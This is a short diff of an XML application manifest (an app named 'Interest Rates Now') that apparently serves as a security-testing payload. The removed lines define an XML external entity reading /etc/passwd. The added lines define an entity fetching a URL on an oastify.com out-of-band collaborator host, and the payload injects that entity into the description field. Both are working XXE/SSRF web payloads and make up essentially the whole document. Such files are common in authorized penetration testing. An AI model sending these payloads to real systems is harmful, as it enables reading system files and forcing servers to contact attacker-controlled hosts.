@@ -1,12 +1,13 @@
 <?xml version="1.0"?>
 <!DOCTYPE data [
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ELEMENT data ANY >
+<!ENTITY ssrf SYSTEM "http://xklhdajtoik39nc4a4epaj646vcm0dt1i.oastify.com/somefile">
 ]>
 <app>
      <id>gj8dl19d0</id>
      <name>Interest Rates Now</name>
      <provider>Interest Rater</provider>
-     <description>&file;</description>
+     <description>&ssrf;</description>
      <extensionpoint>
           <location>REPORTING_VIEW</location>
           <label>label</label>
